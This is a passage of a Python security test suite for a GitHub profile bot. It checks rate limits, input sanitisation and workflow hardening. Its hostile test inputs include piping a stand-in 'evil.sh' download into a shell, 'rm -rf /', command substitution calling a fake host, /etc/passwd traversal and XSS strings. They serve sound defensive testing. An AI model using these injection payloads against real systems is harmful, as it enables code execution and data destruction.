#!/usr/bin/env python3
"""Security regression suite for the nikhilreddy00 profile system.

    python3 -I security_tests.py /path/to/repo [-v]

* Imports repo code ONLY from the path given as argv[1].
* Never touches the network (sockets are disabled before any repo import).
* Never writes inside the repo: every write goes to a temp copy.
* No pytest. Exit status 0 = every control holds; 1 = at least one FAIL.

Result kinds
  PASS       a claimed control was exercised and held
  FAIL       a claimed control is broken -> exit 1
  KNOWN-GAP  a documented weakness that is still present (does not fail CI;
             flips to GAP-CLOSED once fixed, then promote it to a hard check)
  GAP-CLOSED a known gap no longer reproduces
  SKIP       prerequisite missing (e.g. numpy for the render tests)
"""

from __future__ import annotations

import contextlib
import copy
import datetime as dt
import importlib.util
import io
import json
import os
import re
import shutil
import socket
import sys
import tempfile
import traceback
import xml.etree.ElementTree as ET
from pathlib import Path

# --------------------------------------------------------------------------
# 0. Hard network kill switch (installed before importing anything from the repo)
# --------------------------------------------------------------------------


def _no_net(*_a, **_k):
    raise OSError("network disabled by security_tests.py")


socket.socket.connect = _no_net            # type: ignore[assignment]
socket.socket.connect_ex = _no_net         # type: ignore[assignment]
socket.create_connection = _no_net         # type: ignore[assignment]
socket.getaddrinfo = _no_net               # type: ignore[assignment]

if len(sys.argv) < 2 or not Path(sys.argv[1], "scripts", "agent.py").is_file():
    sys.exit("usage: python3 -I security_tests.py /path/to/repo [-v]")

REPO = Path(sys.argv[1]).resolve()
VERBOSE = "-v" in sys.argv[2:]
OWNER = "nikhilreddy00"
SLUG = f"{OWNER}/{OWNER}"
FAKE_TOKEN = "ghs_TESTTOKEN_must_never_be_echoed_0123456789"

RESULTS: list[tuple[str, str, str]] = []   # (status, name, evidence)


def record(status: str, name: str, evidence: str = "") -> None:
    RESULTS.append((status, name, evidence))
    print(f"[{status:<10}] {name}" + (f"\n             {evidence}" if evidence and (VERBOSE or status != "PASS") else ""))


def check(name: str):
    """Hard control: assertion failure -> FAIL."""
    def deco(fn):
        try:
            ev = fn()
            record("PASS", name, ev or "")
        except _Skip as s:
            record("SKIP", name, str(s))
        except AssertionError as e:
            record("FAIL", name, str(e) or "assertion failed")
        except Exception:
            record("FAIL", name, "exception: " + traceback.format_exc(limit=3).strip().splitlines()[-1])
        return fn
    return deco


def gap(name: str):
    """Known gap: fn returns evidence when the gap is still present, or raises GapClosed."""
    def deco(fn):
        try:
            ev = fn()
            record("KNOWN-GAP", name, ev or "")
        except _GapClosed as g:
            record("GAP-CLOSED", name, str(g))
        except _Skip as s:
            record("SKIP", name, str(s))
        except Exception:
            record("FAIL", name, "gap probe crashed: " + traceback.format_exc(limit=3).strip().splitlines()[-1])
        return fn
    return deco


class _Skip(Exception):
    pass


class _GapClosed(Exception):
    pass


# --------------------------------------------------------------------------
# 1. Sandbox: a temp copy of the files the agent writes/reads
# --------------------------------------------------------------------------

SANDBOX = Path(tempfile.mkdtemp(prefix="profile-sec-"))
for rel in ("README.md", "profile.toml", "site/data.json"):
    (SANDBOX / rel).parent.mkdir(parents=True, exist_ok=True)
    shutil.copy2(REPO / rel, SANDBOX / rel)
ORIG_README = (SANDBOX / "README.md").read_text()
ORIG_TOML = (SANDBOX / "profile.toml").read_text()
DATA = json.loads((SANDBOX / "site" / "data.json").read_text())

os.environ["GITHUB_REPOSITORY"] = SLUG
os.environ["GITHUB_TOKEN"] = FAKE_TOKEN


def _load(name: str, path: Path):
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod
    spec.loader.exec_module(mod)
    return mod


AG = _load("agent_script_under_test", REPO / "scripts" / "agent.py")   # puts REPO/scripts on sys.path
from profile_engine import agent as ENGINE      # noqa: E402  (resolved from REPO/scripts)
from profile_engine import readme as README_MOD  # noqa: E402
from profile_engine import svg as SVG            # noqa: E402

assert Path(ENGINE.__file__).resolve().is_relative_to(REPO), "imported profile_engine from outside the repo path"
AG.ROOT = SANDBOX   # every read/write the agent does now happens in the sandbox

NOW = dt.datetime.now(dt.timezone.utc)


def iso(d: dt.datetime) -> str:
    return d.strftime("%Y-%m-%dT%H:%M:%SZ")


# --------------------------------------------------------------------------
# 2. Fake GitHub
# --------------------------------------------------------------------------

HOSTILE_README = (
    "# Title\n```\nfenced code with @mention\n```\nUnbalanced fence next\n```bash\n"
    "rm -rf / @everyone </sub> <script>alert(1)</script> ~~~\n`inline` ``double``\n"
    "[link](javascript:alert(1)) ![img](https://evil.example/p.png)\n"
)


class FakeGitHub:
    """In-memory issue store that answers the REST queries agent.py makes.

    store entries: {number, title, user:{login}, created_at, labelled(bool)}.
    `labels=agent` returns labelled issues; otherwise `creator=` and `since=`
    are honoured (since is updated_at on GitHub; here updated == created).
    """

    def __init__(self, accounts=None, history=None):
        self.calls: list[tuple[str, str, object]] = []
        self.accounts = accounts or {}
        self.store = [dict(i) for i in (history or [])]
        self.raw_requests: list[object] = []

    def _query(self, path):
        from urllib.parse import parse_qs, urlsplit
        q = {k: v[0] for k, v in parse_qs(urlsplit(path).query).items()}
        items = self.store
        if q.get("labels") == "agent":
            items = [i for i in items if i.get("labelled", True)]
        if "creator" in q:
            items = [i for i in items if i["user"]["login"].lower() == q["creator"].lower()]
        if "since" in q:
            items = [i for i in items if i["created_at"] >= q["since"]]
        items = sorted(items, key=lambda i: (i["created_at"], i["number"]), reverse=True)
        page, per = int(q.get("page", 1)), int(q.get("per_page", 30))
        out = []
        for i in items[(page - 1) * per: page * per]:
            names = list(i.get("labels", [])) + (["agent"] if i.get("labelled", True) else [])
            row = {k: v for k, v in i.items() if k not in ("labelled", "labels")}
            row["labels"] = [{"name": n} for n in names]
            out.append(row)
        return out

    def api(self, method, path, body=None, ok=(200, 201, 204)):
        self.calls.append((method, path, copy.deepcopy(body)))
        if method == "GET" and path.startswith("/users/"):
            login = path.split("/")[2]
            created = self.accounts.get(login.lower(), NOW - dt.timedelta(days=400))
            return {"login": login, "created_at": iso(created)}
        if method == "GET" and path.startswith("/search/issues"):
            return {"total_count": sum(1 for i in self.store if i.get("labelled", True))}
        if method == "GET" and "/issues?" in path:
            return copy.deepcopy(self._query(path))
        m = re.fullmatch(r"/repos/[^/]+/[^/]+/issues/(\d+)/labels", path)
        if method == "POST" and m:
            names = (body or {}).get("labels", [])
            for i in self.store:
                if i["number"] == int(m.group(1)):
                    if "agent" in names:
                        i["labelled"] = True
                    i.setdefault("labels", []).extend(n for n in names if n != "agent")
        return {}

    def urlopen(self, req, timeout=None):
        self.raw_requests.append(req)
        url = req if isinstance(req, str) else req.full_url
        if not url.startswith("https://raw.githubusercontent.com/"):
            raise OSError("unexpected fetch " + url)
        return contextlib.closing(io.BytesIO(HOSTILE_README.encode()))

    # helpers
    def writes(self):
        return [c for c in self.calls if c[0] != "GET"]

    def bodies_text(self):
        return "\n".join(json.dumps(b, ensure_ascii=False) for _, _, b in self.calls if b is not None)

    def labelled(self):
        """True only if the run applied the `agent` (answered) label."""
        return any(m == "POST" and p.endswith("/labels") and isinstance(b, dict) and "agent" in b.get("labels", [])
                   for m, p, b in self.calls)

    def declined(self):
        return any(m == "PATCH" and isinstance(b, dict) and b.get("state_reason") == "not_planned" for m, p, b in self.calls)

    def answered(self):
        return any(m == "PATCH" and isinstance(b, dict) and b.get("state_reason") == "completed" for m, p, b in self.calls)

    def gets(self, needle="/issues?"):
        return sum(1 for m, p, _ in self.calls if m == "GET" and needle in p)


def hist_issue(number, user, title="agent: ls", age=dt.timedelta(minutes=10), labelled=True, labels=()):
    return {"number": number, "title": title, "user": {"login": user}, "created_at": iso(NOW - age),
            "labelled": labelled, "labels": list(labels)}


def run_issue(title, user="alice-dev", user_type="User", number=None, gh=None, toml=None):
    """Run scripts/agent.py respond() against the fake API. The issue itself is put in the
    store first (it exists on GitHub before the workflow starts). Returns (gh, readme, stdout)."""
    gh = gh or FakeGitHub()
    if number is None:
        number = max([i["number"] for i in gh.store] + [999]) + 1
    if not any(i["number"] == number for i in gh.store):
        gh.store.append({"number": number, "title": title, "user": {"login": user}, "created_at": iso(NOW), "labelled": False})
    (SANDBOX / "README.md").write_text(ORIG_README)
    (SANDBOX / "profile.toml").write_text(toml if toml is not None else ORIG_TOML)
    os.environ.update(ISSUE_NUMBER=str(number), ISSUE_TITLE=title, ISSUE_AUTHOR=user,
                      ISSUE_AUTHOR_TYPE=user_type, ISSUE_CREATED_AT=iso(NOW))
    AG.api = gh.api
    real_urlopen = AG.urllib.request.urlopen
    AG.urllib.request.urlopen = gh.urlopen
    out = io.StringIO()
    try:
        with contextlib.redirect_stdout(out):
            AG.respond()
    finally:
        AG.urllib.request.urlopen = real_urlopen
    return gh, (SANDBOX / "README.md").read_text(), out.getvalue()


def agent_section(readme: str) -> str:
    m = re.search(r"<!--live:agent:start-->(.*?)<!--live:agent:end-->", readme, re.S)
    assert m, "agent markers missing"
    return m.group(1)


def readme_outside_agent(readme: str) -> str:
    return re.sub(r"<!--live:agent:start-->.*?<!--live:agent:end-->", "", readme, flags=re.S)


ROW = re.compile(r"^\| \[@([A-Za-z0-9-]{1,39})\]\(https://github\.com/\1\) \| `([a-z0-9 ()-]+)` \| \d{4}-\d\d-\d\d \d\d:\d\d \|$")
ALLOWED_SHOWN = re.compile(r"^(?:whoami|ls|cat(?: [A-Za-z0-9._-]+)?|stats (?:30|90|365)|langs|clusters|stack|experience|"
                           r"contact|random|neofetch|help|sudo hire nikhil|\(unknown command\))$")


def assert_session_block_is_structured(section: str):
    for line in section.strip().splitlines():
        if not line.startswith("|") or line.startswith("| Visitor") or line.startswith("| :--"):
            continue
        m = ROW.match(line)
        assert m, f"unexpected README log row: {line!r}"
        assert ALLOWED_SHOWN.match(m.group(2)), f"non-normalized command in README: {m.group(2)!r}"
    for line in section.strip().splitlines():
        if line and not line.startswith("|"):
            assert re.fullmatch(r"(\*\*[\d,]+ commands?\*\* run by \*\*[\d,]+ visitors?\*\* so far\. Latest:|"
                                r"_No runs yet\. Be the first: click a command above\._)", line), f"unexpected README log text {line!r}"


# --------------------------------------------------------------------------
# 3. Agent guards
# --------------------------------------------------------------------------

print(f"repo under test: {REPO}\nsandbox: {SANDBOX}\n")
print("== Agent guards (scripts/agent.py respond) ==")


@check("bots/apps are declined (user.type != User), nothing logged, no profile lookup")
def _():
    for utype, login in (("Bot", "dependabot[bot]"), ("Bot", "evilbot"), ("Organization", "some-org"), ("Mannequin", "m")):
        gh, readme, _ = run_issue("agent: whoami", user=login, user_type=utype)
        assert gh.declined() and not gh.answered() and not gh.labelled(), f"{utype}/{login} not declined"
        assert not any(p.startswith("/users/") for _, p, _ in gh.calls), "profile looked up for a bot"
        assert readme == ORIG_README, "README changed for a bot"
    return "Bot, Organization, Mannequin all declined"


@check("logins failing SAFE_LOGIN are declined before any URL is built from them")
def _():
    bad = ["../../repos/x", "a/b", "-lead", "trail-", "dou--ble", "x" * 40, "user name", "evil|pipe",
           "a](javascript:alert(1))", "dependabot[bot]", "ünïcode", "a\nb", ""]
    for login in bad:
        gh, readme, _ = run_issue("agent: ls", user=login)
        assert gh.declined() and not gh.answered(), f"login {login!r} not declined"
        assert not any(p.startswith("/users/") for _, p, _ in gh.calls), f"{login!r} reached /users/ path"
        assert readme == ORIG_README
    ok = ["a", "A1", "a-b-c", "x" * 39]
    for login in ok:
        assert ENGINE.SAFE_LOGIN.fullmatch(login), f"valid login {login!r} rejected"
    return f"{len(bad)} malformed logins declined; {len(ok)} valid ones accepted by regex"


@check("accounts younger than 14 days are declined; 15-day-old accepted")
def _():
    gh, readme, _ = run_issue("agent: ls", user="newbie", gh=FakeGitHub(accounts={"newbie": NOW - dt.timedelta(days=13, hours=23)}))
    assert gh.declined() and not gh.labelled() and readme == ORIG_README, "young account answered"
    assert not any(p.endswith("/comments") for m, p, _ in gh.calls if m == "POST"), "decline should be silent"
    gh, readme, _ = run_issue("agent: ls", user="oldie", gh=FakeGitHub(accounts={"oldie": NOW - dt.timedelta(days=15)}))
    assert gh.answered() and gh.labelled(), "15-day-old account declined"
    return "13d23h -> declined; 15d -> answered"


@check("profile.toml [agent].blocked_users is honoured (case-insensitive), before any profile lookup")
def _():
    toml = ORIG_TOML.replace("blocked_users = []", 'blocked_users = ["SpamLord"]')
    assert toml != ORIG_TOML, "could not find blocked_users = [] in profile.toml"
    gh, readme, _ = run_issue("agent: ls", user="spamlord", toml=toml)
    assert gh.declined() and not gh.labelled() and readme == ORIG_README
    assert not any(p.startswith("/users/") for _, p, _ in gh.calls)
    return "spamlord declined via blocked_users=['SpamLord']"


@check("per-user daily limit: 5th run in 24h answered, 6th declined (case-insensitive)")
def _():
    four = [hist_issue(i, "Alice-Dev", age=dt.timedelta(hours=i)) for i in range(1, 5)]
    gh, _, _ = run_issue("agent: ls", user="alice-dev", gh=FakeGitHub(history=four))
    assert gh.answered(), "5th run declined"
    five = [hist_issue(i, "ALICE-DEV", age=dt.timedelta(hours=i)) for i in range(1, 6)]
    gh, readme, _ = run_issue("agent: ls", user="alice-dev", gh=FakeGitHub(history=five))
    assert gh.declined() and not gh.labelled() and readme == ORIG_README, "6th run answered"
    old = [hist_issue(i, "alice-dev", age=dt.timedelta(hours=25 + i)) for i in range(10)]
    gh, _, _ = run_issue("agent: ls", user="alice-dev", gh=FakeGitHub(history=old))
    assert gh.answered(), "runs older than 24h counted"
    return "4 prior -> answered; 5 prior -> declined; 10 prior >24h -> answered"


@check("global hourly cap: 30 runs/hour from anyone -> declined")
def _():
    h = [hist_issue(i, f"user{i}", age=dt.timedelta(minutes=i)) for i in range(30)]
    gh, readme, _ = run_issue("agent: ls", user="alice-dev", gh=FakeGitHub(history=h))
    assert gh.declined() and readme == ORIG_README, "31st run in an hour answered"
    gh, _, _ = run_issue("agent: ls", user="alice-dev", gh=FakeGitHub(history=h[:29]))
    assert gh.answered(), "30th run declined"
    return "29 -> answered, 30 -> declined"


@check("history pagination: limits still apply when >100 labelled issues exist")
def _():
    h = [hist_issue(i, f"filler{i}", age=dt.timedelta(hours=2 + i / 100)) for i in range(150)]
    h += [hist_issue(900 + i, "alice-dev", age=dt.timedelta(hours=3)) for i in range(5)]
    h.sort(key=lambda x: x["created_at"], reverse=True)
    gh, _, _ = run_issue("agent: ls", user="alice-dev", gh=FakeGitHub(history=h))
    pages = sum(1 for m, p, _ in gh.calls if "/issues?" in p)
    assert gh.declined(), "user over limit on page 2 was answered"
    return f"declined; history read in {pages} page requests"


@check("owner bypasses age/limit gates (documented behaviour) and is still logged normally")
def _():
    h = [hist_issue(i, OWNER, age=dt.timedelta(minutes=i)) for i in range(40)]
    gh, readme, _ = run_issue("agent: ls", user=OWNER, gh=FakeGitHub(history=h))
    assert gh.answered()
    assert not any(p.startswith("/users/") for _, p, _ in gh.calls)
    assert_session_block_is_structured(agent_section(readme))


print("\n== Untrusted title handling ==")

HOSTILE_TITLES = [
    "agent: ls CANARY01 <script>alert(1)</script>",
    "agent: cat CANARY02",
    "agent: cat praxis CANARY03 && curl evil.sh | sh",
    "agent: stats 90; CANARY04 rm -rf /",
    "agent: $(curl CANARY05.evil) `id`",
    "agent: ${{ secrets.GITHUB_TOKEN }} CANARY06",
    "agent: help\n<!--live:agent:end-->CANARY07<img src=x onerror=alert(1)>",
    "agent: ls\r\n::set-output name=x::CANARY08\n::add-mask::x",
    "agent: CANARY09 | evil | table |",
    "agent: [CANARY10](javascript:alert(1))",
    "agent: @everyone @nikhilreddy00 CANARY11",
    "agent: whoami \u202eCANARY12\u202c",
    "agent:\u00a0ls\u200b\u200dCANARY13",
    "agent： ls CANARY14",                          # fullwidth colon
    "\u0430gent: ls CANARY15",                       # Cyrillic a homoglyph
    "agent: \uff4c\uff53 CANARY16",                  # fullwidth "ls"
    "agent: \u0130\u0307 CANARY17",                  # Turkish dotted I (lower() expands)
    "agent: cat ../../../etc/passwd CANARY18",
    "agent: cat praxis/../../CANARY19",
    "agent: sudo hire CANARY20 now",
    "agent: \x1b[31mCANARY21\x1b[0m",
    "agent: " + "CANARY22 " * 1200,                  # ~10.8k chars
    "Agent:    $> stats 365 CANARY23",
    "AGENT: >>> cat prax CANARY24",
    "agent: " + "\U0001F600" * 3000 + " CANARY25",
    "agent: \udcff CANARY26",                        # lone surrogate (as Python sees invalid UTF-8 env)
]


@check("hostile titles: raw text never reaches comments, labels, README or stdout")
def _():
    n = 0
    for i, title in enumerate(HOSTILE_TITLES):
        canary = re.search(r"CANARY\d\d", title).group(0)
        try:
            gh, readme, out = run_issue(title, user="alice-dev", number=2000 + i)
        except ValueError as e:      # os.environ refuses NUL etc.; GitHub can't deliver those either
            continue
        blob = gh.bodies_text() + readme + out
        assert canary not in blob, f"{canary} leaked for title {title[:60]!r}"
        assert FAKE_TOKEN not in blob, "token echoed"
        assert readme_outside_agent(readme) == readme_outside_agent(ORIG_README), "README changed outside live:agent"
        assert readme.count("<!--live:agent:start-->") == 1 and readme.count("<!--live:agent:end-->") == 1
        assert_session_block_is_structured(agent_section(readme))
        assert not any(l.startswith("::") for l in out.splitlines()), "workflow command emitted on stdout"
        for _, path, _ in gh.calls:
            assert re.fullmatch(r"/(users/[A-Za-z0-9-]+|repos/[\w.-]+/[\w.-]+/(labels|issues/\d+(/(comments|labels|lock))?|issues\?[\w=&:.-]+))", path), f"odd API path {path!r}"
        n += 1
    return f"{n}/{len(HOSTILE_TITLES)} hostile titles processed; no canary, token or marker leaked"


@check("title is capped at 200 chars before parsing/logging")
def _():
    seen = []
    orig = AG.update_readme
    AG.update_readme = lambda just=None: seen.append(just)
    try:
        run_issue("agent: ls " + "x" * 10_000)
    finally:
        AG.update_readme = orig
    assert seen and len(seen[0]["title"]) <= 200, f"title len {len(seen[0]['title']) if seen else '?'}"
    return "10,010-char title -> 200 chars"


@check("parse() is an allowlist: every output is (known command, normalized args)")
def _():
    import random as _r
    rnd = _r.Random(1)
    alphabet = "agent: AGENT catlsstats90365sudohire$>`|<>\"'\\/\n\t\u202e\u200b.-_@#;&()[]{}praxis"
    names = {r["name"] for r in DATA["repos"]}
    titles = HOSTILE_TITLES + ["agent: " + "".join(rnd.choice(alphabet) for _ in range(rnd.randint(0, 60))) for _ in range(3000)]
    for t in titles:
        p = ENGINE.parse(t, DATA)
        if p is None:
            continue
        cmd, args = p
        assert cmd in set(ENGINE.COMMANDS) | {"sudo", "unknown"}, cmd
        if cmd == "cat":
            assert args == [] or (len(args) == 1 and args[0] in names), args
        elif cmd == "stats":
            assert args in (["30"], ["90"], ["365"]), args
        else:
            assert args == [], (cmd, args)
        assert ALLOWED_SHOWN.match(ENGINE.display(cmd, args)), ENGINE.display(cmd, args)
    return f"{len(titles)} fuzzed titles all normalized"


@check("every command's reply is one well-formed console block; GitHub fetch carries no token")
def _():
    titles = ["agent: " + c for c in list(ENGINE.COMMANDS) + ["cat praxis", "stats 30", "sudo hire", "nope"]]
    for t in titles:
        gh, _, _ = run_issue(t)
        comments = [b["body"] for m, p, b in gh.calls if p.endswith("/comments")]
        assert len(comments) == 1, (t, len(comments))
        assert comments[0].count("```") == 2, f"{t}: console block broken ({comments[0].count('```')} fences)"
        for req in gh.raw_requests:
            hdrs = {k.lower(): v for k, v in (req.header_items() if hasattr(req, "header_items") else [])}
            assert "authorization" not in hdrs, "token sent to raw.githubusercontent.com"
    return f"{len(titles)} commands incl. `cat praxis` with a hostile README (unbalanced ``` fence) stay inside the block"


@check("sessions_section: edited/hostile titles and malformed logins in history never render raw")
def _():
    hist = [
        {"number": 1, "title": "agent: ls CANARY30 <img src=x>", "user": "alice-dev", "created_at": iso(NOW)},
        {"number": 2, "title": "agent: cat praxis\n| injected | row |", "user": "bob", "created_at": iso(NOW)},
        {"number": 3, "title": "agent: help", "user": "evil|user", "created_at": iso(NOW)},
        {"number": 4, "title": "agent: help", "user": "x](javascript:alert(1))", "created_at": iso(NOW)},
        {"number": 5, "title": "not an agent title CANARY31", "user": "carol", "created_at": iso(NOW)},
        {"number": 6, "title": "agent: help", "user": None, "created_at": iso(NOW)},
    ]
    s = ENGINE.sessions_section(hist, DATA, SLUG)
    assert "CANARY3" not in s and "injected" not in s and "javascript" not in s and "evil|user" not in s, s
    assert_session_block_is_structured(s)
    return "2 valid rows rendered, 4 hostile rows dropped/normalized"


@check("svg.esc escapes & < > \" ; README _cell escapes | and newlines")
def _():
    e = SVG.esc('<script>&"x"</script>')
    assert "<" not in e and '"' not in e and "&amp;" in e, e
    c = README_MOD._cell("a|b\nc")
    assert c == "a\\|b c", c


print("\n== Rate limits under abuse ==")


@gap("declined runs still perform 3 public writes (comment, close, lock) -> spam amplification")
def _():
    gh, _, _ = run_issue("agent: ls", user="newbie", gh=FakeGitHub(accounts={"newbie": NOW}))
    w = gh.writes()
    if not any(p.endswith("/comments") for _, p, _ in w):
        raise _GapClosed(f"declines are silent ({len(w)} non-comment writes: label, close, lock)")
    return f"{len(w)} writes per declined issue: " + ", ".join(f"{m} {p.split('/')[-1]}" for m, p, _ in w)


@check("burst: 4 prior runs + 6 issues opened at once by one user -> exactly 1 answered (no TOCTOU)")
def _():
    # Every run reads a snapshot taken before ANY of the burst was labelled (models parallel runs:
    # the concurrency group is per issue number, so nothing serialises them).
    base = [hist_issue(i, "alice-dev", age=dt.timedelta(hours=i)) for i in range(1, 5)]
    base += [hist_issue(3000 + n, "alice-dev", age=dt.timedelta(seconds=1), labelled=False) for n in range(6)]
    answered = []
    for n in range(6):
        gh, _, _ = run_issue("agent: ls", user="alice-dev", number=3000 + n, gh=FakeGitHub(history=copy.deepcopy(base)))
        if gh.answered():
            answered.append(3000 + n)
    assert answered == [3000], f"answered {answered} (limit allows 1 more)"
    return "only the lowest-numbered issue of the burst answered"


@check("declined / in-flight (unlabelled) agent issues count toward the limits")
def _():
    spam = [hist_issue(4000 + i, "alice-dev", age=dt.timedelta(minutes=50 - i), labelled=False) for i in range(5)]
    gh, _, _ = run_issue("agent: ls", user="alice-dev", gh=FakeGitHub(history=spam))
    assert gh.declined(), "5 unlabelled issues by the same user in 24h did not count"
    return "6th issue declined although none of the first 5 were labelled"


@gap("limit counts only issues whose CURRENT title matches `agent:` -> renaming old issues resets the quota")
def _():
    renamed = [hist_issue(5000 + i, "alice-dev", title="thanks, cool profile", age=dt.timedelta(hours=1 + i)) for i in range(5)]
    gh, _, _ = run_issue("agent: ls", user="alice-dev", gh=FakeGitHub(history=renamed))
    if gh.declined():
        raise _GapClosed("renamed issues still counted")
    return "5 answered issues renamed by their author -> 6th run answered (count by creator, not by title)"


@gap("global hourly cap can be burned by accounts that are themselves declined (new/bot/blocked)")
def _():
    # Once declined, junk issues carry `agent-declined` and stop counting (only the
    # few seconds before a decline lands are still counted).
    junk = [hist_issue(6000 + i, "brand-new-acct", age=dt.timedelta(minutes=40 - i), labelled=False,
                       labels=["agent-declined"]) for i in range(30)]
    gh, _, _ = run_issue("agent: ls", user="alice-dev", gh=FakeGitHub(history=junk, accounts={"brand-new-acct": NOW}))
    if gh.answered():
        raise _GapClosed("declined authors no longer consume the global cap")
    return "30 issues from a 0-day-old account (all declined) -> legitimate visitor told 'busy' (availability DoS)"


@gap("window query stops after 10 pages and fails OPEN (rank computed on a truncated list)")
def _():
    flood = [hist_issue(7001 + i, f"sybil{i}", age=dt.timedelta(minutes=30 - i / 100), labelled=False) for i in range(1100)]
    me = hist_issue(7000, "alice-dev", age=dt.timedelta(minutes=35), labelled=False)
    gh, _, _ = run_issue("agent: ls", user="alice-dev", number=7000, gh=FakeGitHub(history=flood + [me]))
    if gh.declined():
        raise _GapClosed("truncated window fails closed")
    return "1,100 newer issues in the hour -> this issue not in the 1,000 fetched -> rank 1 -> answered"


@gap("blocked_users only stops NEW runs; already-logged runs keep showing the blocked login in README")
def _():
    toml = ORIG_TOML.replace("blocked_users = []", 'blocked_users = ["offensive-name"]')
    (SANDBOX / "profile.toml").write_text(toml)
    gh = FakeGitHub(history=[hist_issue(1, "offensive-name")])
    AG.api = gh.api
    (SANDBOX / "README.md").write_text(ORIG_README)
    AG.update_readme()
    s = agent_section((SANDBOX / "README.md").read_text())
    (SANDBOX / "profile.toml").write_text(ORIG_TOML)
    (SANDBOX / "README.md").write_text(ORIG_README)
    if "offensive-name" not in s:
        raise _GapClosed("blocked user filtered from the log")
    return "sessions_section() does not consult blocked_users"


@gap("every run lists ALL labelled issues (unbounded pagination; hourly job can exhaust API quota)")
def _():
    h = [hist_issue(i, f"u{i}", age=dt.timedelta(days=3 + i / 1000)) for i in range(2500)]
    gh, _, _ = run_issue("agent: ls", user="alice-dev", gh=FakeGitHub(history=h))
    pages = gh.gets("labels=agent")
    if pages <= 10:
        raise _GapClosed(f"bounded at {pages} page reads; totals from the search API")
    return f"2,500 historic runs -> {pages} GET pages of labelled issues per run (README rebuild; hourly job does the same)"


# --------------------------------------------------------------------------
# 4. Workflow static checks
# --------------------------------------------------------------------------

print("\n== Workflows ==")
WF = {p.name: p.read_text() for p in (REPO / ".github" / "workflows").glob("*.yml")}


def _yaml(text):
    try:
        import yaml  # optional; falls back to regex-only checks
        return yaml.safe_load(text)
    except ImportError:
        return None


@check("workflow-level `permissions: {}` in every workflow")
def _():
    for name, t in WF.items():
        assert re.search(r"(?m)^permissions:\s*\{\s*\}\s*$", t), f"{name} lacks top-level permissions: {{}}"
    return ", ".join(WF)


@check("per-job grants are minimal (agent: contents+issues write; render: contents write, issues read; deploy: pages+id-token)")
def _():
    want = {("agent.yml", "respond"): {"contents": "write", "issues": "write"},
            ("profile.yml", "render"): {"contents": "write", "issues": "read"},
            ("profile.yml", "deploy"): {"contents": "read", "pages": "write", "id-token": "write"}}
    y = {n: _yaml(t) for n, t in WF.items()}
    if any(v is None for v in y.values()):
        raise _Skip("PyYAML not available")
    for (wf, job), perms in want.items():
        got = y[wf]["jobs"][job].get("permissions")
        assert got == perms, f"{wf}:{job} permissions {got} != {perms}"
    for wf, doc in y.items():
        for job, spec in doc["jobs"].items():
            assert "permissions" in spec, f"{wf}:{job} inherits default token permissions"
    return "all jobs declare exact permissions"


@check("every third-party action is pinned to a full 40-hex commit SHA")
def _():
    uses = [(n, u) for n, t in WF.items() for u in re.findall(r"uses:\s*([^\s#]+)", t)]
    bad = [(n, u) for n, u in uses if not re.fullmatch(r"[\w.-]+/[\w./-]+@[0-9a-f]{40}", u)]
    assert not bad, f"unpinned: {bad}"
    return f"{len(uses)} uses: lines pinned"


@check("agent.yml: checkout has persist-credentials: false")
def _():
    t = WF["agent.yml"]
    m = re.search(r"uses:\s*actions/checkout@\S+.*?\n(\s+with:\s*\n(?:\s{10,}.*\n)+)", t)
    assert m and re.search(r"persist-credentials:\s*false", m.group(1)), "persist-credentials not false"


@check("no ${{ github.event.* }} / untrusted context is interpolated inside any run: script")
def _():
    untrusted = re.compile(r"\$\{\{\s*[^}]*(github\.event|github\.head_ref|inputs\.|steps\.[^}]*outputs)[^}]*\}\}")
    hits = []
    for name, t in WF.items():
        lines = t.splitlines()
        i = 0
        while i < len(lines):
            m = re.match(r"^(\s*)(-\s*)?run:\s*(.*)$", lines[i])
            if m:
                indent = len(m.group(1)) + (len(m.group(2) or ""))
                block = [m.group(3)]
                j = i + 1
                while j < len(lines) and (not lines[j].strip() or len(lines[j]) - len(lines[j].lstrip()) > indent):
                    block.append(lines[j]); j += 1
                for b in block:
                    if untrusted.search(b):
                        hits.append(f"{name}: {b.strip()[:90]}")
                i = j
            else:
                i += 1
    attacker = [h for h in hits if "github.event" in h or "head_ref" in h]
    assert not attacker, f"attacker-controlled expression in run: {attacker}"
    return "issue title/author only via env:" + (f" (note: step-output interpolation present: {len(hits)} line(s))" if hits else "")


@check("agent.yml passes issue fields to the script only through env, and only on issues:opened")
def _():
    y = _yaml(WF["agent.yml"])
    if y is None:
        raise _Skip("PyYAML not available")
    on = y.get("on", y.get(True))
    assert on == {"issues": {"types": ["opened"]}}, on
    steps = y["jobs"]["respond"]["steps"]
    run_step = [s for s in steps if "agent.py" in str(s.get("run", ""))][0]
    assert run_step["env"]["ISSUE_TITLE"] == "${{ github.event.issue.title }}"
    assert "pull_request_target" not in WF["agent.yml"] and "workflow_run" not in WF["agent.yml"]
    assert y["jobs"]["respond"].get("timeout-minutes", 999) <= 10


@gap("profile.yml render job: checkout persists the contents:write token in .git/config while pip/numpy run")
def _():
    t = WF["profile.yml"]
    render = t.split("  deploy:")[0]
    if "persist-credentials: false" in render:
        raise _GapClosed("render checkout no longer persists credentials")
    return "profile.yml render: actions/checkout without persist-credentials: false; `pip install` + numpy import follow"


@gap("requirements.txt is not pinned/hashed (numpy runs with GITHUB_TOKEN[+PROFILE_TOKEN] in env)")
def _():
    req = (REPO / "requirements.txt").read_text()
    if re.search(r"==", req) and "--hash=" in req and "--require-hashes" in WF["profile.yml"]:
        raise _GapClosed("pinned with hashes")
    return f"requirements.txt: {req.strip()!r}; pip install without --require-hashes"


@gap("PROFILE_TOKEN secret still wired into the render step")
def _():
    if "PROFILE_TOKEN" not in WF["profile.yml"]:
        raise _GapClosed("PROFILE_TOKEN removed")
    return "profile.yml passes secrets.PROFILE_TOKEN to build_profile.py (same step imports numpy)"


@gap("agent.yml `if:` matches 'agent:' anywhere in the title, so non-commands still spin up a runner")
def _():
    if "startsWith(" in WF["agent.yml"]:
        raise _GapClosed("uses startsWith")
    return "contains(github.event.issue.title, 'agent:') triggers on e.g. 'help: my agent: broke'"


@gap("d3 SRI is re-checked only AFTER deploy-pages (browser SRI still fails closed)")
def _():
    t = WF["profile.yml"]
    if t.index("openssl dgst") < t.index("actions/deploy-pages"):
        raise _GapClosed("SRI checked before deploy")
    return "integrity check step runs after actions/deploy-pages"


# --------------------------------------------------------------------------
# 5. Static site checks
# --------------------------------------------------------------------------

print("\n== Site ==")
INDEX = (REPO / "site" / "index.html").read_text()
CSP = re.search(r'http-equiv="Content-Security-Policy"\s+content="([^"]+)"', INDEX)


